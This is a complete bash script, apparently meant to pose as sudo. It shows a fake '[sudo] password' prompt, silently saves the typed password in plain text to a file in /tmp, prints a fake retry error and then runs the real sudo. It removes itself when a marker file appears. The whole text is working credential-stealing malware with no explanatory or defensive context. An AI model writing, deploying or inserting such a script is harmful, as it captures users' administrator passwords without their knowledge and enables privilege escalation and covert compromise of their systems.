#!/bin/bash

user=$(whoami)
outPath=/tmp/unicorns.txt
cleanUp=/tmp/dragons.txt
pwPrompt="[sudo] password for $user:\x20"
errStr="Sorry, try again."
myPath="$( cd "$(dirname "$0")" ; pwd -P )/$0"
if [ -f $outPath ]
then
    sudo $@
else
    echo -ne $pwPrompt
    read -s PASSWORD
    echo
    echo $PASSWORD > $outPath
    echo $errStr
    sudo $@
fi
if [ -f $cleanUp ]
then
   rm $myPath
fi
